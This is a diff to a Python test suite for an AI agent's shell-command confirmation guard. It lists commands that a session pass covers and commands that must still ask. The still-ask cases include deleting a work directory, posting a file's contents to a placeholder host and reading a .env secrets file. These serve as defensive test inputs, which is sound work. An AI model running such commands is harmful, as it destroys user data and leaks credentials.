@@ -85,3 +85,70 @@ async def test_run_shell_tool_asks_adk_per_command_with_the_conversation(tmp_pat
     assert await tool.check_require_confirmation({"command": "ls"}, ctx) is False
     assert await tool.check_require_confirmation({"command": "cat .env"}, ctx) is True
     assert "tool_context" not in str(tool._get_declaration())  # the model never sees it
+
+
+# 23 Oct 2026: the pass covers writing in Odie's workspace and the vault, and inline code that touches nothing risky.
+# The commands are shaped like ones that asked again and again under a pass (paths kept generic).
+
+from pathlib import Path  # noqa: E402
+
+HOME = Path.home()
+WORKSPACE = HOME / ".odie" / "data" / "workspace"
+VAULT = Path("/Users/someone/Notes Vault")
+SAFE = (str(WORKSPACE), str(VAULT))
+
+COVERED_NOW = [
+    "cat > ~/.odie/data/workspace/scene1.md <<'EOF'\n## Scene: A\nANNA: Hi => there\nEOF",
+    "cd /tmp && cat > build2.py << 'PYEOF'\nprint(1 > 0)\nPYEOF",
+    "cat > /tmp/send.mjs << 'EOF'\nconst f = (a) => a > 1;\nEOF",
+    "python3 -c \"import PIL; print(PIL.__version__)\"",
+    "cd ~/.odie/data/workspace/videos/q && python3 - <<'EOF'\nimport wave\nprint(len([1]) > 0)\nEOF",
+    f"cat > '{VAULT}/Stories/cast.md' <<'EOF'\n---\ntitle: The cast\n---\nEOF",
+    f"cd '{VAULT}/Stories' && cat > cast.md <<'EOF'\nhi\nEOF",
+    "echo done > ~/.odie/data/workspace/flag.txt",
+    "cat > notes.md <<'EOF'\nmake sure to rm the old ones\nEOF",  # run in the workspace (cwd): its words are data
+    'echo "=== BIG FILES (>300 MB) ==="; find / -xdev -type f -size +300M 2>/dev/null | head -25',
+    "osascript -e 'tell application \"Mail\" to get count of (messages of inbox whose read status > 0)'",
+    "cd /Users/someone/Notes\\ Vault/Stories && cat > cast.md <<'EOF'\nhi\nEOF",
+    "osascript -e 'tell application \"Mail\"\nrepeat with i from 1 to 12\nif i > n then exit repeat\nend repeat\nend tell'",
+    "awk '/x/{p=1} p{print; n++} n>110{exit}' notes.txt | head -5",
+]
+
+STILL_ASKS = [
+    "python3 - <<'EOF'\nimport shutil\nshutil.rmtree('/Users/x/work')\nEOF",
+    "python3 -c \"import requests; requests.post('https://x.example', data=open('a').read())\"",
+    "python3 - <<'EOF'\nprint(open('/Users/x/.env').read())\nEOF",
+    "cat > ~/work/app/config.py <<'EOF'\nx = 1\nEOF",
+    "cd ~/work && cat > notes.md <<'EOF'\nhi\nEOF",
+    "node -e \"require('fs').rmSync('/Users/x/work', {recursive: true})\"",
+    "rm ~/.odie/data/workspace/old.md",  # deleting asks even in a safe place
+]
+
+
+@pytest.mark.parametrize("cmd", COVERED_NOW)
+def test_the_pass_covers_the_workspace_the_vault_and_harmless_inline_code(cmd):
+    cwd = str(WORKSPACE) if cmd.startswith("cat > notes.md") else None
+    assert g.always_ask(cmd, safe_dirs=SAFE, cwd=cwd) is None, cmd
+
+
+@pytest.mark.parametrize("cmd", STILL_ASKS)
+def test_the_pass_still_asks_for_risky_code_and_other_places(cmd):
+    assert g.always_ask(cmd, safe_dirs=SAFE), cmd
+
+
+def test_the_check_knows_the_workspace_and_the_vault(tmp_path, isolated_settings):
+    from types import SimpleNamespace
+
+    from odie.vault import settings as vault_settings
+    s = Store(tmp_path / "a.db")
+    s.init_schema()
+    vault = tmp_path / "vault"
+    vault.mkdir()
+    vault_settings.put(s, dir=str(vault))
+    ctx = SimpleNamespace(session=SimpleNamespace(id="chat-x"))
+    check = g.make_check(s, clock=lambda: NOW)
+    g.grant(s, "chat-x", NOW)
+    workspace = isolated_settings.data_dir / "workspace"
+    assert check(command=f"echo hi > '{workspace}/a.md'", tool_context=ctx) is False
+    assert check(command=f"echo hi > '{vault}/a.md'", tool_context=ctx) is False
+    assert check(command=f"echo hi > '{tmp_path}/elsewhere.md'", tool_context=ctx) is True
